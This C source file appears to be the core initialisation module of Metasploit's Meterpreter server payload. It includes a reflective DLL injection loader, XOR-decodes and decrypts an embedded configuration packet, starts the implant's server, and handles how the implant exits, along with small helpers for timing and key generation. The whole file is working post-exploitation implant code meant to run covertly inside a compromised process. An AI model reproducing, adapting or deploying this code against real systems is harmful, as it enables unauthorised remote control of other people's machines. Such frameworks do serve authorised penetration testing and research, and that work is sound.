#include "metsrv.h"

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION
#include <excpt.h>

#define	UnpackAndLinkLibs(p, s)

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }


#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#define RDIDLL_NOEXPORT
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include "../ReflectiveDLLInjection/inject/src/GetProcAddressR.c"
#include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"

#include "packet_encryption.h"

DWORD Init(MetsrvConfig* config)
{
	dprintf("[METSRV] Initializing from configuration: 0x%p", config);

	// take a copy of the packet header so that we can manipulate it locally
	PacketHeader header = *(PacketHeader*)config->config_packet;

	// decode as it might be xor'd
	xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));

	UINT configLength = ntohl(header.length) - sizeof(TlvHeader);
	UINT configBlockSize = sizeof(PacketHeader) + configLength;
	dprintf("[METSRV] Config length is %u 0x%08x", configLength, configLength);
	dprintf("[METSRV] Config block size is %u 0x%08x", configBlockSize, configBlockSize);

	// Get a full copy of the entire packet ready for decoding
	PBYTE configBuffer = (PBYTE)malloc(configBlockSize);
	memcpy_s(configBuffer, configBlockSize, config->config_packet, configBlockSize);
	Packet* configPacket = NULL;
	dprintf("[METSRV] decrypting config packet");
	SetLastError(decrypt_packet(NULL, &configPacket, configBuffer, configBlockSize));

#ifdef DEBUGTRACE
	PWSTR logPath = packet_get_tlv_value_wstring(configPacket, TLV_TYPE_DEBUG_LOG);
	INIT_LOGGING(logPath);
	free(logPath);
#endif

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
	// a pointer to the metserv configuration, so do a nasty cast and move on.
	dprintf("[METSRV] Getting ready to init with config %p", config);
	DWORD result = server_setup(config, configPacket);
	UINT exitFunc = packet_get_tlv_value_uint(configPacket, TLV_TYPE_EXITFUNC);

	dprintf("[METSRV] Exiting with %08x", exitFunc);

	packet_destroy(configPacket);
	// We also handle exit func directly in metsrv now because the value is added to the
	// configuration block and we manage to save bytes in the stager/header as well.
	switch (exitFunc)
	{
	case EXITFUNC_SEH:
		SetUnhandledExceptionFilter(NULL);
		break;
	case EXITFUNC_THREAD:
		ExitThread(0);
		break;
	case EXITFUNC_PROCESS:
		ExitProcess(0);
		break;
	default:
		break;
	}
	return result;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_METASPLOIT_ATTACH:
		bReturnValue = Init((MetsrvConfig*)lpReserved);
		break;
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

#define SLEEP_MAX_SEC (MAXDWORD / 1000)

/*!
 * @brief Returns a unix timestamp in UTC.
 * @return Integer value representing the UTC Unix timestamp of the current time.
 */
int current_unix_timestamp(void) {
	SYSTEMTIME system_time;
	FILETIME file_time;
	ULARGE_INTEGER ularge;

	GetSystemTime(&system_time);
	SystemTimeToFileTime(&system_time, &file_time);

	ularge.LowPart = file_time.dwLowDateTime;
	ularge.HighPart = file_time.dwHighDateTime;
	return (long)((ularge.QuadPart - 116444736000000000) / 10000000L);
}

/*!
 * @brief Sleep for the given number of seconds.
 * @param seconds DWORD value representing the number of seconds to sleep.
 * @remark This was implemented so that extended sleep times can be used (beyond the
 *         49 day limit imposed by Sleep()).
 */
VOID sleep(DWORD seconds)
{
	while (seconds > SLEEP_MAX_SEC)
	{
		Sleep(SLEEP_MAX_SEC * 1000);
		seconds -= SLEEP_MAX_SEC;
	}
	Sleep(seconds * 1000);
}

VOID xor_bytes(BYTE xorKey[4], LPBYTE buffer, DWORD bufferSize)
{
	dprintf("[XOR] XORing %u bytes with key %02x%02x%02x%02x", bufferSize, xorKey[0], xorKey[1], xorKey[2], xorKey[3]);
	for (DWORD i = 0; i < bufferSize; ++i)
	{
		buffer[i] ^= xorKey[i % 4];
	}
}

VOID rand_xor_key(BYTE buffer[4])
{
	static BOOL initialised = FALSE;
	if (!initialised)
	{
		srand((unsigned int)time(NULL));
		initialised = TRUE;
	}

	buffer[0] = (rand() % 254) + 1;
	buffer[1] = (rand() % 254) + 1;
	buffer[2] = (rand() % 254) + 1;
	buffer[3] = (rand() % 254) + 1;
}

BOOL is_null_guid(BYTE guid[sizeof(GUID)])
{
	return memcmp(guid, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", sizeof(GUID)) == 0 ? TRUE : FALSE;
}
